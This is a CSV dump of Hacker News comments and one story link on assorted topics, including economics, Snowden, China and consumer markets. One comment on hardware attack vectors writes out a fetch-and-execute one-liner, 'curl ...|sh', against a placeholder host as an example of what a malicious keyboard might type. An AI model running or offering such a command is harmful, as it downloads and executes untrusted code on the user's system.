ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
7129166,comment,7127742,7127742,1,0,bjz_,,,"Will it support latex math?",1390805989
7129165,comment,7128284,7129053,5,0,MarkPNeyer,,,"that&#x27;s kind of how it was. there were no earnings from investments when there was no investment; when everybody was working it was workers who took all of the gains because there was nobody else involved.",1390805935
7129164,comment,7128959,7128959,1,0,higherpurpose,,,"This should be a known fact acknowledged by everyone by now, from his leaks, but I don&#x27;t think it is, and it&#x27;s good to have him still being able to speak up about these things, instead of being locked up in solitary confinement without being able to respond to the governments&#x27; continuous lies.",1390805889
7129163,comment,7125527,7126771,2,0,BrandonMarc,,,"Exactly.<p>In other news, scientists astounded the world with a new discovery on mars: a small, hexagonal rock with a threaded cylindrical hole.<p>Slam-dunk proof Mars had intelligent life at some point!<p>Even more amazing: it just happened to be sitting near the rover. And it wasn&#x27;t there when the rover drove up to that point.<p>Proof the martians are just putting evidence right in front of us, while being sneaky at the same time! How clever of them.",1390805889
7129162,comment,7128284,7129053,7,0,lotyrin,,,"Early foraging societies maybe? (Before agriculture or systemized bartering, let alone economic specialization or capitalism.)",1390805875
7129161,comment,7125239,7125581,1,0,e12e,,,"<p><pre><code>    100 000 = profit * customers (* months)</code></pre>",1390805776
7129160,story,,,5,0,rcthompson,"The Brittle Grip, Part 2",http://talkingpointsmemo.com/edblog/the-brittle-grip-part-2,,1390805765
7129159,comment,7128514,7129019,3,0,thaumasiotes,,,"China&#x27;s military?!? China doesn&#x27;t exactly have a distinguished history of conquest.  What do they have to show for literally centuries of trying to take Vietnam?<p>It would surely make more sense to fantasize about a more militaristic culture waging the war, no?",1390805757
7129158,comment,7126754,7128717,1,0,rwg,,,"DMA via FireWire (or Thunderbolt or similar) allows you to very quickly poke at system memory with a near-zero risk of being detected.<p>An autonomously malicious PS/2 keyboard, on the other hand, is on the end of a slow (~12 kbit/s) serial interface.  It can only simulate keypresses and receive updates about the keyboard LEDs&#x27; statuses.  It doesn&#x27;t know the current state of the system.  It&#x27;s as likely to type &quot;curl <a href=""http://innocent-looking.org/logo.jpg|sh&quot;"" rel=""nofollow"">http://innocent-looking.org/logo.jpg|sh&quot;</a> in a text editor as it is at a command prompt, so it can&#x27;t type anything autonomously without running the (huge) risk of alerting its owner to its presence.<p>Edit: The &quot;Reversing and exploiting an Apple firmware update&quot; paper linked below talks about persisting a rootkit on a computer by using Spotlight to open Terminal, then typing a command to download and execute a payload.  That runs the same risk of alerting the user to its presence, and it will completely fail if the user has remapped Cmd-Space to something else.",1390805697
7129157,comment,7126403,7127538,2,0,nickff,,,"This is a straw-man; while some may believe all consumers have and require perfect information, not all free-marketers do.<p>If there are many under-informed consumers, these will often select pseudo-randomly, and the few well-informed consumers will select well.  The small number of well-informed consumers will often make the difference between a profitable product and an unprofitable product (especially in highly competitive markets).<p>In many cases, ill-informed consumers will pay for information about products which are significant to them; this is why &quot;Consumer Reports&quot; sells new and used car buying guides, as well as why video game reviews exist, and why Amazon.com has reviews.<p>In cases where purchases are less costly to the consumers, or a repeat purchase is involved, people will often correct based on personal experience and brand reputation, which is imperfect, but relatively effective.",1390805675
